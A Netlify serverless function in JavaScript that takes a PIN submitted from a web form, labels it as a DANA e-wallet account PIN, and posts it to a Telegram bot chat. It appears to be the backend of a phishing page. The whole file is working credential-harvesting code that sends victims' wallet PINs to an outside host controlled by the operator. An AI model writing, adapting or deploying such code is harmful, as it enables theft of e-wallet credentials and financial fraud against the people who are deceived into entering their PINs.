const axios = require('axios');

exports.handler = async function(event, context) {
    try {
        const { pin } = JSON.parse(event.body);
        
        // Telegram bot configuration
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
        
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            throw new Error('Telegram credentials not configured');
        }

        // Format message
        const message = `
├• AKUN | DANA E-WALLET
├───────────────────
├• PIN  : ${pin}
╰───────────────────
        `.trim();

        // Send to Telegram
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true })
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                error: error.message,
                note: 'Make sure TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are set in Netlify environment variables'
            })
        };
    }
};
